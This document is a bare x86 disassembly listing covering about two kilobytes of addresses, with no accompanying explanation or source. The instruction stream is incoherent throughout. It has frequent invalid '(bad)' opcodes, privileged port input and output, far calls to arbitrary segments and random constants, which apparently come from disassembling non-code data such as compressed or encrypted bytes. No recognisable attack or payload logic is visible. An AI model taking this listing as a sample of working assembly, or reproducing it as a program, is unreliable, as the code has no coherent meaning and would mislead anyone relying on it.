  4151f6:	sub    dl,bh
  4151f8:	fisub  DWORD PTR [ebx+0x3f31e3a2]
  4151fe:	and    ebp,DWORD PTR [esi]
  415200:	in     al,0x62
  415202:	inc    edx
  415203:	ror    esp,1
  415205:	sbb    dl,dh
  415207:	gs in  eax,dx
  415209:	adc    ch,bh
  41520b:	push   es
  41520c:	ror    dl,0xdc
  41520f:	add    ebx,DWORD PTR [ebp+0x72]
  415212:	inc    ebx
  415213:	stos   DWORD PTR es:[edi],eax
  415214:	dec    ecx
  415215:	and    cl,BYTE PTR [edx+eiz*2]
  415218:	popf   
  415219:	or     al,0x5e
  41521b:	test   DWORD PTR [ecx+0x2ad4c866],edi
  415221:	and    al,ch
  415223:	xor    BYTE PTR [esi],bl
  415225:	repnz mov esp,0x67ca68f2
  41522b:	cmp    eax,ecx
  41522d:	sar    esi,cl
  41522f:	jp     0x415219
  415231:	dec    esp
  415232:	jmp    0x4151ed
  415234:	retf   
  415235:	iret   
  415236:	cmc    
  415237:	mov    dl,bl
  415239:	xchg   esi,eax
  41523a:	jp     0x415222
  41523c:	mov    ebx,0xbb34fe94
  415241:	mov    bh,0x87
  415243:	into   
  415244:	push   edx
  415245:	lea    ebx,fs:[edx+0x2877b8e4]
  41524c:	or     al,0x79
  41524e:	sti    
  41524f:	xchg   ebx,eax
  415250:	inc    ebp
  415251:	out    0x13,al
  415253:	adc    BYTE PTR [ebx-0x8680e4e],ch
  415259:	into   
  41525a:	(bad)  [ebp+0x11e04963]
  415260:	cmp    DWORD PTR ss:[edi],ecx
  415263:	mov    al,0xf8
  415265:	aad    0xd
  415267:	push   ebx
  415268:	dec    edi
  415269:	pop    ds
  41526a:	int    0x89
  41526c:	rol    ecx,0xb1
  41526f:	inc    ebp
  415270:	xchg   DWORD PTR [esi],ebx
  415272:	sbb    eax,0x36bc0657
  415277:	mov    edi,DWORD PTR [edx-0x65629760]
  41527d:	and    BYTE PTR [edx-0xa],0x97
  415281:	or     edi,DWORD PTR ds:[ebx]
  415284:	pop    esi
  415285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415286:	sar    ch,0xb9
  415289:	fcmovu st,st(3)
  41528b:	cmp    al,0x49
  41528d:	ret    
  41528e:	fadd   st,st(4)
  415290:	adc    eax,0xc84a3fed
  415295:	aad    0xe7
  415297:	sub    DWORD PTR [edi+ebp*1],0x6a
  41529b:	jo     0x41530a
  41529d:	shr    ah,1
  41529f:	lahf   
  4152a0:	lods   eax,DWORD PTR ds:[esi]
  4152a1:	std    
  4152a2:	pop    ecx
  4152a3:	mov    esi,0xc82486b6
  4152a8:	test   al,0xeb
  4152aa:	sbb    DWORD PTR [ebx+0x55],edx
  4152ad:	push   edx
  4152ae:	aas    
  4152af:	sbb    DWORD PTR [esi],edx
  4152b1:	jnp    0x4152ca
  4152b3:	std    
  4152b4:	outs   dx,BYTE PTR ds:[esi]
  4152b5:	adc    eax,0x4fd9e482
  4152ba:	sbb    eax,0xd9301bbb
  4152bf:	popf   
  4152c0:	sahf   
  4152c1:	outs   dx,DWORD PTR ds:[esi]
  4152c2:	inc    ecx
  4152c3:	adc    al,BYTE PTR [esi-0x34]
  4152c6:	dec    edx
  4152c7:	jne    0x415301
  4152c9:	dec    esi
  4152ca:	mov    al,0xc5
  4152cc:	scas   al,BYTE PTR es:[edi]
  4152cd:	push   esp
  4152ce:	pop    ds
  4152cf:	fwait
  4152d0:	jns    0x415343
  4152d2:	fiadd  DWORD PTR [edx]
  4152d4:	in     al,dx
  4152d5:	xlat   BYTE PTR ds:[ebx]
  4152d6:	out    dx,eax
  4152d7:	lds    ecx,FWORD PTR [eax+0x516a41b5]
  4152dd:	arpl   WORD PTR es:[eax-0x36],sp
  4152e1:	ret    
  4152e2:	pop    ds
  4152e3:	push   es
  4152e4:	add    edx,ecx
  4152e6:	add    al,0xd7
  4152e8:	mov    eax,ds:0x84b5640b
  4152ed:	popf   
  4152ee:	ins    BYTE PTR es:[edi],dx
  4152ef:	xchg   edi,eax
  4152f0:	jecxz  0x415360
  4152f2:	xor    ch,0x2e
  4152f5:	fimul  DWORD PTR [ebp+edx*8-0x7b9f71f8]
  4152fc:	xor    al,0xe1
  4152fe:	pop    esi
  4152ff:	arpl   WORD PTR [edx-0x33],cx
  415302:	(bad)  
  415303:	xor    BYTE PTR [edx+ebp*2-0x470fe06],dh
  41530a:	lds    edx,FWORD PTR [esi-0x61]
  41530d:	loopne 0x415343
  41530f:	clc    
  415310:	loopne 0x415298
  415312:	pop    esi
  415313:	pusha  
  415314:	pop    eax
  415315:	xor    DWORD PTR [bx+si-0x30a7],0x927e64cc
  41531e:	pop    ds
  41531f:	mov    dl,0x62
  415321:	adc    dh,BYTE PTR [edi+0x13]
  415324:	cmp    cl,bl
  415326:	test   BYTE PTR [esi],dh
  415328:	sub    BYTE PTR [edi+edi*8-0x40],0xc
  41532d:	add    BYTE PTR [eax-0xfa2451d],cl
  415333:	adc    BYTE PTR [edi],ch
  415335:	xor    al,0x8
  415337:	daa    
  415338:	or     BYTE PTR [eax-0x4c],al
  41533b:	add    DWORD PTR [edi+0x31],esp
  41533e:	xor    eax,0x4e0275b5
  415343:	push   ebp
  415344:	in     al,dx
  415345:	aam    0x7c
  415347:	pushf  
  415348:	and    edx,ecx
  41534a:	cmp    al,0x23
  41534c:	test   al,0x28
  41534e:	adc    esp,DWORD PTR [edi-0x1deb4a56]
  415354:	stos   BYTE PTR es:[edi],al
  415355:	pop    ecx
  415356:	cmp    ecx,DWORD PTR ds:0x48bfc076
  41535c:	(bad)  
  41535d:	mov    edx,0x5d59984b
  415362:	cmp    BYTE PTR [esi+0x15],0xa9
  415366:	jno    0x415332
  415368:	pushf  
  415369:	and    DWORD PTR [edi],edx
  41536b:	loopne 0x4153b7
  41536d:	rcl    ah,1
  41536f:	cmp    eax,0xeb10c167
  415374:	int3   
  415375:	cli    
  415376:	arpl   dx,sp
  415378:	icebp  
  415379:	fidivr WORD PTR [edi+esi*4-0xa811b0b]
  415380:	and    ah,BYTE PTR [edi+edi*4+0x4e863788]
  415387:	jg     0x4153aa
  415389:	dec    edi
  41538a:	mov    eax,ds:0xb05823f6
  41538f:	fldcw  WORD PTR [edx+edx*1]
  415392:	push   0x9b519c69
  415397:	cmp    ebx,edx
  415399:	dec    eax
  41539a:	inc    edi
  41539b:	fdivr  QWORD PTR [ebp+0x66ba0cdc]
  4153a1:	div    DWORD PTR [esi+0x8]
  4153a4:	pop    eax
  4153a5:	(bad)  
  4153a8:	leave  
  4153a9:	stos   BYTE PTR es:[edi],al
  4153aa:	jnp    0x415361
  4153ac:	pop    ss
  4153ad:	clc    
  4153ae:	sub    al,0x3d
  4153b0:	lds    esi,FWORD PTR [eax-0x2d]
  4153b3:	mov    esp,0x3d7b4fa9
  4153b8:	xchg   edi,eax
  4153b9:	adc    BYTE PTR [edx],ah
  4153bb:	inc    ebp
  4153bc:	(bad)  [edx+0x7f]
  4153bf:	add    ecx,eax
  4153c1:	cli    
  4153c2:	push   edi
  4153c3:	mov    ebp,0x9272c3ed
  4153c8:	and    DWORD PTR [edi-0x39],esp
  4153cb:	out    dx,eax
  4153cc:	xor    ebp,DWORD PTR [ecx+0x6f]
  4153cf:	out    dx,eax
  4153d0:	loop   0x4153fc
  4153d2:	xor    ecx,0xffffffa8
  4153d5:	imul   esi,DWORD PTR [edx-0x35aa03ea],0x58
  4153dc:	out    dx,eax
  4153dd:	das    
  4153de:	xor    DWORD PTR [ecx-0x220d25e7],edi
  4153e4:	or     al,0x6a
  4153e6:	mov    esi,0xf8b3a3e8
  4153eb:	and    BYTE PTR [ecx+0x347a1005],al
  4153f1:	mov    dl,0x7c
  4153f3:	loop   0x41541a
  4153f5:	pushf  
  4153f6:	sbb    edi,DWORD PTR [edx-0x4f1402d7]
  4153fc:	mov    bl,0x26
  4153fe:	sbb    DWORD PTR [edx+ebx*2-0x7e992ff0],ecx
  415405:	jnp    0x41546a
  415407:	xor    al,0x8f
  415409:	mov    cl,0x6f
  41540b:	mov    esp,0x68717c04
  415410:	fsub   DWORD PTR [esi+0x69a7dc4c]
  415416:	cs or  esi,esi
  415419:	les    ecx,FWORD PTR [edx-0x19177ba1]
  41541f:	add    eax,0xd0de79b6
  415424:	pop    ds
  415425:	mov    al,0x5
  415427:	push   ecx
  415428:	repz push ebp
  41542a:	ins    DWORD PTR es:[edi],dx
  41542b:	inc    esp
  41542c:	adc    eax,0xce078346
  415431:	xor    esp,DWORD PTR [ecx]
  415433:	fild   QWORD PTR [eax+0x7aaef11e]
  415439:	mov    ecx,0x4e64f46c
  41543e:	add    DWORD PTR [edx+0x1ea335ae],0x4a72e4f3
  415448:	sar    esp,1
  41544a:	adc    ebp,DWORD PTR [edx-0x17]
  41544d:	pop    es
  41544e:	test   DWORD PTR [ebp+0x11],ecx
  415451:	sbb    al,0xd2
  415453:	dec    ebx
  415454:	adc    ah,ch
  415456:	jo     0x415479
  415458:	dec    ebx
  415459:	ffreep st(5)
  41545b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41545c:	mov    ebx,0x9bc81a94
  415461:	fldln2 
  415463:	(bad)  
  415464:	das    
  415465:	dec    edx
  415466:	imul   esi,DWORD PTR [eax-0x2d0d5023],0x2cdad300
  415470:	sbb    eax,0x370c5fcc
  415475:	(bad)  
  415477:	shl    DWORD PTR [ebx-0x1c77f547],cl
  41547d:	xlat   BYTE PTR ds:[ebx]
  41547e:	(bad)
  415481:	or     BYTE PTR [eax],ah
  415483:	pop    edi
  415484:	inc    ebp
  415485:	out    dx,al
  415486:	jno    0x4154e8
  415488:	mov    esp,0x1834318b
  41548d:	jl     0x4154af
  41548f:	dec    esp
  415490:	icebp  
  415491:	inc    eax
  415492:	jecxz  0x41547c
  415494:	or     dh,BYTE PTR [ebx]
  415496:	js     0x41542f
  415498:	pop    eax
  415499:	pop    esp
  41549a:	lock adc BYTE PTR [edi-0x5f5734a5],cl
  4154a1:	jp     0x41542c
  4154a3:	stos   BYTE PTR es:[edi],al
  4154a4:	je     0x4154ee
  4154a6:	lods   al,BYTE PTR ds:[esi]
  4154a7:	or     dh,dh
  4154a9:	mov    BYTE PTR [esi+0x4c],ch
  4154ac:	or     eax,0x73b82449
  4154b1:	out    0xcd,eax
  4154b3:	push   ebp
  4154b4:	inc    esp
  4154b5:	shl    DWORD PTR [ebx+0x78],0x5e
  4154b9:	icebp  
  4154ba:	dec    eax
  4154bb:	jo     0x415442
  4154bd:	in     al,dx
  4154be:	repz adc eax,0x5cba56fb
  4154c4:	mov    BYTE PTR [esp+edi*8],bh
  4154c7:	lahf   
  4154c8:	jae    0x41544c
  4154ca:	push   edi
  4154cb:	xchg   esp,eax
  4154cc:	dec    edi
  4154cd:	pop    ebp
  4154ce:	or     dh,BYTE PTR [ebx+edx*1+0x5f129dff]
  4154d5:	add    DWORD PTR [ebx+0x25],esp
  4154d8:	adc    BYTE PTR [eax+0x6c],dl
  4154db:	mov    bh,0xb
  4154dd:	and    eax,DWORD PTR [edi]
  4154df:	ins    DWORD PTR es:[edi],dx
  4154e0:	ss mov ebx,0xc00e8ed3
  4154e6:	aad    0xfc
  4154e8:	iret   
  4154e9:	lahf   
  4154ea:	(bad)  
  4154eb:	dec    ebp
  4154ec:	fadd   DWORD PTR [ebx]
  4154ee:	dec    ecx
  4154ef:	pop    es
  4154f0:	cmp    al,0x18
  4154f2:	add    BYTE PTR [ebx+0x5b],bh
  4154f5:	jmp    0x415537
  4154f7:	stos   BYTE PTR es:[edi],al
  4154f8:	dec    ebx
  4154f9:	out    0x44,al
  4154fb:	xchg   ebp,eax
  4154fc:	inc    esi
  4154fd:	ins    BYTE PTR es:[edi],dx
  4154fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154ff:	push   ebx
  415500:	or     dl,BYTE PTR [eax+0x1]
  415503:	or     bl,BYTE PTR [esi+0x52]
  415506:	mov    al,BYTE PTR [edx-0x7b]
  415509:	push   ss
  41550a:	mov    ds:0xdf8f9f55,eax
  41550f:	sub    al,0xa2
  415511:	dec    eax
  415512:	and    ah,ah
  415514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415515:	pop    esp
  415516:	ds gs sahf 
  415519:	(bad)  
  41551a:	out    0x86,eax
  41551c:	aam    0xa1
  41551e:	data16 sbb ch,BYTE PTR [eax-0x2ee3296a]
  415525:	clc    
  415526:	ds push ss
  415528:	dec    edx
  415529:	mov    esp,0x5365a81e
  41552e:	mov    edx,0x12931c3d
  415533:	jne    0x4155b4
  415535:	cs stc 
  415537:	pusha  
  415538:	push   ebp
  415539:	xor    eax,0x2235dfc1
  41553e:	sbb    al,0x17
  415540:	ret    
  415541:	in     eax,0xac
  415543:	mov    al,ds:0xfb3021a0
  415548:	data16 cmp dl,BYTE PTR [edx+0x4ec50669]
  41554f:	mov    eax,0xc183403e
  415554:	and    ah,BYTE PTR [edx]
  415556:	xchg   edx,eax
  415557:	rcl    ecx,1
  415559:	jl     0x4155b1
  41555b:	call   0xd061:0xa9a1d23a
  415562:	push   esi
  415563:	in     eax,0xcc
  415565:	push   edi
  415566:	pop    ss
  415567:	sti    
  415568:	(bad)  [ebx]
  41556a:	adc    BYTE PTR [ebx-0x6be713fc],ah
  415570:	dec    esi
  415571:	push   ebp
  415572:	in     eax,0x21
  415574:	adc    DWORD PTR [ebp+0x6c],ecx
  415577:	jge    0x4155c1
  415579:	jb     0x415586
  41557b:	mov    ecx,0x826eadb9
  415580:	(bad)  
  415581:	fstp   TBYTE PTR [edi+0x6a057f2b]
  415587:	mov    dh,0x1c
  415589:	jmp    0x18b8:0xe92ab925
  415590:	mov    ah,0x2d
  415592:	test   BYTE PTR [ebp-0x31],ah
  415595:	dec    BYTE PTR [esi]
  415597:	cmc    
  415598:	mov    ch,0xe
  41559a:	jns    0x4155a1
  41559c:	sub    ebp,DWORD PTR [esi]
  41559e:	mov    BYTE PTR [edi+ebp*8-0x6bef066],dh
  4155a5:	xchg   ebp,eax
  4155a6:	loop   0x41557b
  4155a8:	aam    0xf6
  4155aa:	sbb    ebx,edx
  4155ac:	inc    ecx
  4155ad:	push   ecx
  4155ae:	ficomp DWORD PTR [ecx]
  4155b0:	fidiv  DWORD PTR [ebp-0x3b]
  4155b3:	inc    ecx
  4155b4:	xor    DWORD PTR [ecx],edi
  4155b6:	mov    bl,0x15
  4155b8:	(bad)  
  4155b9:	rcl    DWORD PTR [eax-0x4c001be4],1
  4155bf:	mov    ah,0x98
  4155c1:	out    dx,al
  4155c2:	repnz inc edx
  4155c4:	or     esp,DWORD PTR [esi-0x72]
  4155c7:	fidivr DWORD PTR [esi-0x2e]
  4155ca:	and    ebx,eax
  4155cc:	in     eax,dx
  4155cd:	jo     0x4155d8
  4155cf:	sub    al,0x6e
  4155d1:	div    BYTE PTR [edi-0x5a3638f5]
  4155d7:	ins    DWORD PTR es:[edi],dx
  4155d8:	in     al,0x67
  4155da:	xchg   DWORD PTR [ebx],eax
  4155dc:	mov    gs,WORD PTR [edi-0x7a]
  4155df:	xchg   BYTE PTR [ebx+0x31d42c6e],ah
  4155e5:	mov    edi,0x684febcf
  4155ea:	aas    
  4155eb:	mov    ecx,0xc514742d
  4155f0:	jbe    0x4155c6
  4155f2:	sub    BYTE PTR [edi],0x94
  4155f5:	std    
  4155f6:	mov    eax,ds:0xc1bb6db1
  4155fb:	pusha  
  4155fc:	push   0x5b
  4155fe:	cmp    al,0x31
  415600:	pop    ds
  415601:	jb     0x4155b2
  415603:	(bad)  
  415604:	mov    al,0xa3
  415606:	fsubr  QWORD PTR [edx]
  415608:	jno    0x4155fc
  41560a:	xor    esp,0xffffff98
  41560d:	or     BYTE PTR [edx],ah
  41560f:	in     eax,dx
  415610:	jle    0x41566b
  415612:	sbb    eax,0xa2041f1b
  415617:	mov    ecx,edi
  415619:	loopne 0x4155ef
  41561b:	dec    edi
  41561c:	mov    WORD PTR [ebx-0x78bc493f],ds
  415622:	loopne 0x415650
  415624:	xchg   esp,eax
  415625:	xor    ecx,0xffffffc4
  415628:	hlt    
  415629:	call   0xab142fa3
  41562e:	jbe    0x4155c1
  415630:	adc    DWORD PTR [eax-0x3c50906a],esi
  415636:	mov    ecx,esi
  415638:	or     cl,BYTE PTR [edi+0x1b]
  41563b:	xor    al,0xf6
  41563e:	cwde   
  41563f:	jg     0x415623
  415641:	jg     0x4155cc
  415643:	pushf  
  415644:	or     al,0xca
  415646:	dec    esp
  415647:	sbb    DWORD PTR [ecx+edi*8-0x46b036d4],esp
  41564e:	jp     0x4156a0
  415650:	fild   DWORD PTR ds:0x7f671af3
  415656:	sub    dh,dh
  415658:	out    0xc2,eax
  41565a:	mov    ds:0xee2de79d,al
  41565f:	retf   0x205c
  415662:	ret    0xf3a5
  415665:	cld    
  415666:	mov    ch,0xe3
  415668:	cs inc ebp
  41566a:	pop    ecx
  41566b:	mov    WORD PTR [esi-0x51],es
  41566e:	xor    DWORD PTR [ebx-0x53a75869],esp
  415674:	retf   
  415675:	(bad)  
  415676:	(bad)  
  415677:	and    ebp,esi
  415679:	clc    
  41567a:	adc    BYTE PTR [esi],dl
  41567c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41567d:	push   esi
  41567e:	xchg   ebp,eax
  41567f:	popf   
  415680:	pushf  
  415681:	aaa    
  415682:	or     BYTE PTR [ecx+0x36b54338],cl
  415688:	aam    0xaf
  41568a:	shr    esp,cl
  41568c:	xchg   esp,eax
  41568d:	push   ebp
  41568e:	and    DWORD PTR [ebx*4-0x440fdc98],eax
  415695:	enter  0xf26,0x19
  415699:	arpl   WORD PTR [ebx+0x791304ec],bp
  41569f:	sub    ch,BYTE PTR [ecx-0x70]
  4156a2:	push   edx
  4156a3:	mov    DWORD PTR ds:0xaf982605,eax
  4156a9:	push   ds
  4156aa:	add    ebp,DWORD PTR [esi-0x1ab8c6bb]
  4156b0:	pop    edx
  4156b1:	jno    0x41567a
  4156b3:	call   0x2af9:0xce4d5fda
  4156ba:	aaa    
  4156bb:	sub    DWORD PTR [ebx+0x65f41dbb],ebx
  4156c1:	fst    st(2)
  4156c3:	shl    BYTE PTR [edx-0x3ea650ac],cl
  4156c9:	adc    al,0xb5
  4156cb:	jnp    0x41565a
  4156cd:	jg     0x415656
  4156cf:	int3   
  4156d0:	sbb    DWORD PTR [edi-0x1e507e19],eax
  4156d6:	cli    
  4156d7:	inc    esi
  4156d8:	arpl   WORD PTR [esi-0x6b],ax
  4156db:	and    al,0x5f
  4156dd:	pushf  
  4156de:	(bad)  [eax-0x1]
  4156e1:	cmp    bl,al
  4156e3:	les    ebx,FWORD PTR [esi]
  4156e5:	and    DWORD PTR [edi-0x73f9c099],edx
  4156eb:	inc    ebx
  4156ec:	div    BYTE PTR [esi+0x2c7a604]
  4156f2:	int    0x3e
  4156f4:	xlat   BYTE PTR ds:[ebx]
  4156f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156f6:	or     bl,BYTE PTR [eax+0x66]
  4156f9:	pop    edi
  4156fa:	clc    
  4156fb:	retf   0x82ff
  4156fe:	jnp    0x4156bd
  415700:	xor    al,0xce
  415702:	clc    
  415703:	inc    ebx
  415704:	sbb    BYTE PTR [esi+0x16],ch
  415707:	into   
  415708:	cmp    si,WORD PTR [edi]
  41570b:	gs pushf 
  41570d:	adc    eax,DWORD PTR [esi]
  41570f:	sti    
  415710:	ret    
  415711:	fnstsw WORD PTR [edx+0x27975e1a]
  415717:	adc    bl,dh
  415719:	(bad)  
  41571a:	sbb    eax,0x35b3b61f
  41571f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415720:	mov    esp,0xe877c55b
  415725:	xlat   BYTE PTR ds:[ebx]
  415726:	mov    ecx,0x773a4856
  41572b:	push   ebx
  41572c:	call   0x242f:0xd9dfebb0
  415733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415734:	mov    ah,0x90
  415736:	push   ecx
  415737:	ret    0x5226
  41573a:	xchg   edx,eax
  41573b:	push   ss
  41573c:	je     0x415774
  41573e:	pop    esp
  41573f:	shl    DWORD PTR [ecx],1
  415741:	adc    al,0xf6
  415743:	push   cs
  415744:	jns    0x4157a5
  415746:	mov    ds:0x6164047f,al
  41574b:	int    0x2c
  41574d:	stos   BYTE PTR es:[edi],al
  41574e:	sbb    al,0x5
  415750:	repnz add ecx,ebx
  415753:	aas    
  415754:	mov    cl,0x6a
  415756:	adc    al,0x29
  415758:	in     eax,dx
  415759:	sub    al,0xf3
  41575b:	sbb    DWORD PTR [esi-0x29],esp
  41575e:	mov    esp,0x746a19ca
  415763:	mov    ch,0x7b
  415765:	retf   0x8856
  415768:	enter  0x2670,0x7e
  41576c:	push   ss
  41576d:	add    ch,BYTE PTR [ecx-0x291f687]
  415773:	fld    DWORD PTR [esi+0x2c]
  415776:	adc    BYTE PTR [eax+eax*4],ah
  415779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41577a:	(bad)  
  41577b:	add    al,0x1e
  41577d:	idiv   BYTE PTR [edi]
  41577f:	inc    ecx
  415780:	sub    edx,DWORD PTR [eax+0x23c9abdd]
  415786:	jg     0x4157e6
  415788:	sahf   
  415789:	clc    
  41578a:	scas   eax,DWORD PTR es:[edi]
  41578b:	mov    dl,0xa2
  41578e:	mov    esi,0xd177be16
  415793:	or     al,0x5a
  415795:	or     dl,BYTE PTR [esi]
  415797:	mov    WORD PTR [ebx-0xe165d7d],ss
  41579d:	add    DWORD PTR [eax-0x33a0295c],esi
  4157a3:	or     ecx,DWORD PTR [ecx-0x6f90157f]
  4157a9:	ror    BYTE PTR [ebx],0xac
  4157ac:	shl    ecx,1
  4157ae:	(bad)  
  4157af:	dec    esi
  4157b0:	mov    bh,ch
  4157b2:	repz rcr DWORD PTR [ebx+0x694cd2b4],cl
  4157b9:	push   ebp
  4157ba:	(bad)  
  4157bb:	adc    BYTE PTR [esi+0x51],dh
  4157be:	xchg   DWORD PTR [ecx-0xb],esi
  4157c1:	inc    ebp
  4157c2:	arpl   di,di
  4157c4:	(bad)  
  4157c5:	push   0xd
  4157c7:	pop    ebp
  4157c8:	js     0x415806
  4157ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157cb:	jo     0x4157e6
  4157cd:	inc    esp
  4157ce:	jle    0x41576c
  4157d0:	into   
  4157d1:	push   edi
  4157d2:	mov    BYTE PTR [edx],bl
  4157d4:	mov    cl,0x20
  4157d6:	ret    
  4157d7:	call   0x1b49:0x389d314
  4157de:	fistp  DWORD PTR [ebx-0x3d]
  4157e1:	retf   0xe6ce
  4157e4:	xor    al,0x33
  4157e6:	outs   dx,DWORD PTR ds:[esi]
  4157e7:	and    cl,BYTE PTR [edx-0x6e5ade2f]
  4157ed:	inc    esi
  4157ee:	inc    edi
  4157ef:	ror    DWORD PTR [eax],cl
  4157f1:	pop    esi
  4157f2:	rol    edi,cl
  4157f4:	cld    
  4157f5:	es (bad) 
  4157f8:	mov    ds:0xb522ba40,eax
  4157fd:	pop    edi
  4157fe:	out    0xf,eax
  415800:	in     eax,0x10
  415802:	in     al,dx
  415803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415804:	push   eax
  415805:	sbb    dl,BYTE PTR [edx-0x42]
  415808:	mov    edx,0x85f74d3c
  41580d:	ja     0x415824
  41580f:	(bad)  
  415810:	push   edx
  415811:	jnp    0x41582c
  415813:	or     BYTE PTR [esp+esi*8+0x50d2eba9],dl
  41581a:	xor    al,0x4a
  41581c:	in     al,0x49
  41581e:	push   es
  41581f:	dec    eax
  415820:	push   edx
  415821:	lock add BYTE PTR [ecx+0x7c],bh
  415825:	mov    ds:0x7e25bb4b,al
  41582a:	retf   
  41582b:	(bad)  
  41582d:	loop   0x41580a
  41582f:	pop    ds
  415830:	jmp    0x415861
  415832:	inc    edi
  415833:	je     0x41587b
  415835:	test   DWORD PTR [ebx+0xfd0ba38],ebp
  41583b:	mov    BYTE PTR [ecx],ch
  41583d:	add    al,0xd9
  41583f:	jmp    0x1bf5:0x72cd20b3
  415846:	sub    BYTE PTR [edx-0x8493120],cl
  41584c:	xor    al,0x89
  41584e:	sbb    DWORD PTR [eax-0x16],0xffffff94
  415852:	sub    al,0xe0
  415854:	ret    0x89e0
  415857:	es lods al,BYTE PTR gs:[esi]
  41585a:	pop    ss
  41585b:	imul   ebx,DWORD PTR [ebx],0xf2e78a95
  415861:	nop
  415862:	cs jo  0x415811
  415865:	mov    eax,ds:0x9cad8ea2
  41586a:	jl     0x41584d
  41586c:	mov    esp,DWORD PTR gs:[esi-0x34]
  415870:	pause  
  415872:	nop
  415873:	aaa    
  415874:	hlt    
  415875:	xor    dh,BYTE PTR [eax+edx*1+0x4ad51d32]
  41587c:	cdq    
  41587d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41587e:	sub    ebx,DWORD PTR [ecx+0x78759ef5]
  415884:	in     eax,dx
  415885:	(bad)  
  415886:	mov    ds:0x311f698,eax
  41588b:	jb     0x415824
  41588d:	in     al,0xf9
  41588f:	push   edx
  415890:	cmp    DWORD PTR [eax],0x51037965
  415896:	(bad)  
  415897:	scas   eax,DWORD PTR es:[edi]
  415898:	fisub  DWORD PTR [eax-0x31]
  41589b:	fsub   QWORD PTR ds:0x50394f55
  4158a1:	add    bl,bh
  4158a3:	mov    al,ds:0x56f3793
  4158a8:	out    0x25,al
  4158aa:	daa    
  4158ab:	fidiv  DWORD PTR ds:0x61f169e
  4158b1:	inc    edi
  4158b2:	jno    0x415894
  4158b4:	mov    ds:0xec1399b2,eax
  4158b9:	(bad)  
  4158ba:	jle    0x4158bf
  4158bc:	xchg   cl,cl
  4158be:	inc    ebx
  4158bf:	xchg   ebp,esi
  4158c1:	aas    
  4158c2:	sbb    DWORD PTR [eax+0x76],ebp
  4158c5:	int    0x96
  4158c7:	sar    DWORD PTR [eax+0x4033c2be],0x18
  4158ce:	pop    ebp
  4158cf:	adc    BYTE PTR [esi+edi*2],0x20
  4158d3:	nop
  4158d4:	retf   
  4158d5:	std    
  4158d6:	stos   DWORD PTR es:[edi],eax
  4158d7:	mov    dh,0x0
  4158d9:	mov    ecx,0x82b42335
  4158de:	les    esp,FWORD PTR [esi-0xfb5c16e]
  4158e4:	inc    edx
  4158e5:	pop    ebx
  4158e6:	in     al,0xe2
  4158e8:	adc    eax,0xe5cbe1e7
  4158ed:	sub    BYTE PTR [ecx+ebp*4],al
  4158f0:	or     BYTE PTR [esi+esi*2+0x53],0x8b
  4158f5:	addr16 mov esi,0x9795f8dc
  4158fb:	push   ss
  4158fc:	mov    ebp,0x30cebffd
  415901:	dec    ebx
  415902:	jge    0x4158fe
  415904:	push   es
  415905:	and    eax,0xde1907bf
  41590a:	test   al,0x8d
  41590c:	inc    ecx
  41590d:	xor    DWORD PTR [edi-0x3d],edi
  415910:	sub    esi,DWORD PTR [edx-0x7a]
  415913:	int    0xdd
  415915:	cmp    bh,ah
  415917:	out    0xd6,al
  415919:	pop    edi
  41591a:	repnz lds esi,FWORD PTR [eax+0x37d3ec55]
  415921:	push   ss
  415922:	in     eax,dx
  415923:	xor    eax,0xd56aa3ba
  415928:	stc    
  415929:	mov    bh,0x70
  41592b:	dec    edi
  41592c:	(bad)  
  41592d:	shrd   ebx,ecx,cl
  415930:	sbb    ch,cl
  415932:	sub    esi,DWORD PTR [ecx]
  415934:	or     BYTE PTR [esi],ch
  415936:	aam    0x2d
  415938:	gs inc ebp
  41593a:	dec    edi
  41593b:	or     al,BYTE PTR [esi+0x7cf16459]
  415941:	ins    BYTE PTR es:[edi],dx
  415942:	xchg   ecx,eax
  415943:	xchg   edi,eax
  415944:	mov    ah,0xb9
  415946:	mov    ch,0xbf
  415948:	add    eax,0x3ae762ad
  41594d:	mov    ds:0x6a7a3fdb,eax
  415952:	int    0x6
  415954:	mov    esi,0x7df1b505
  415959:	jo     0x415991
  41595b:	jmp    0xd0806f6f
  415960:	out    dx,al
  415961:	(bad)  
  415962:	popa   
  415963:	mov    ecx,0xfe785883
  415968:	test   al,0x7a
  41596a:	xlat   BYTE PTR ds:[ebx]
  41596b:	xchg   esp,eax
  41596c:	sub    BYTE PTR [ebx],cl
  41596e:	ss inc esi
  415970:	loope  0x41596b
  415972:	and    dh,BYTE PTR [eax+0x43833b4a]
  415978:	inc    edx
  415979:	mov    ecx,0x215315b1
  41597e:	mov    edx,0xc64cfe46
  415983:	and    eax,0x472df9cb
  415988:	inc    edi
  415989:	call   0xdb84:0x6536760
  415990:	mov    ds,WORD PTR [edi-0x555bd940]
  415996:	pop    ds
  415997:	xchg   edi,eax
  415998:	not    DWORD PTR [edx+ecx*2-0x15]
  41599c:	pop    ebp
  41599d:	dec    eax
  41599e:	icebp  
  41599f:	sbb    edx,DWORD PTR [esi+0x466f0fd7]
  4159a5:	add    BYTE PTR [eax+0x276cd04f],al
  4159ab:	adc    esi,edi
  4159ad:	push   edx
  4159ae:	pop    ebp
  4159af:	sub    ebx,DWORD PTR [ebp-0x3e76dce4]
  4159b5:	aaa    
  4159b6:	xlat   BYTE PTR ds:[ebx]
  4159b7:	jmp    0x2307:0x96719533
  4159be:	cmp    DWORD PTR [ebx],0xced5bbad
  4159c4:	lock aaa 
  4159c6:	lods   al,BYTE PTR ds:[esi]
  4159c7:	std    
  4159c8:	js     0x4159fc
  4159ca:	out    0x7,eax
  4159cc:	cs adc al,0xd1
  4159cf:	aaa    
  4159d0:	div    DWORD PTR [edi]
  4159d2:	pop    edx
  4159d3:	fcmovne st,st(5)
  4159d5:	sub    dl,BYTE PTR [edx-0x7ffde065]
  4159db:	test   al,0xc3
  4159dd:	jae    0x4159b8
  4159df:	add    esp,edx
  4159e1:	cmp    bl,dh
